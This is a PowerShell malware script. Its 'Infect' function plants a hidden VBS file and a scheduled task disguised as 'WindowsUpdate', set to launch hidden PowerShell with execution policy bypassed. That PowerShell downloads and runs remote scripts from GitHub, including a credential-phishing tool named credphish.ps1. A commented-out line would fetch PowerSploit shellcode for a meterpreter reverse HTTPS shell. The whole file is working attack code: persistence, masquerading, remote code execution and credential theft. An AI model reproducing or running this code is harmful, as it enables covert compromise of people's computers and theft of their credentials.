Function Infect
{
  

New-Item -ItemType Directory -Force -Path C:\Microsoft\Windows\Desktop\Privdata\lifxe
schtasks /create  /TN WindowsUpdate /TR 'C:\Windows\System32\WScript.exe //Nologo //B C:\Microsoft\Windows\Desktop\Initialize.vbs' /sc onidle /i 20
New-Item 'C:\Microsoft\Windows\Desktop\Initialize.txt' -type file -force
Add-Content C:\Microsoft\Windows\Desktop\Initialize.txt "Dim objShell`r`nSet objShell = WScript.CreateObject( ""WScript.Shell"" )`r`ncommand = ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile IEX ((New-Object Net.WebClient).DownloadString('https://github.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/raw/master/Infection.ps1')); FetchCommands -Force | Invoke-Expression}"" `r`nobjShell.Run command,0`r`nSet objShell = Nothing"
Rename-Item C:\Microsoft\Windows\Desktop\Initialize.txt Initialize.vbs
Set-ItemProperty -Path C:\Microsoft\Windows\Desktop\Initialize.vbs -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

}





function FetchCommands
{
  #IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.0.0.10 -Lport 1111 -Force 
  IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/master/Tools/credphish.ps1'));
  IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/master/Tools/rscript_nodown.ps1'));
}
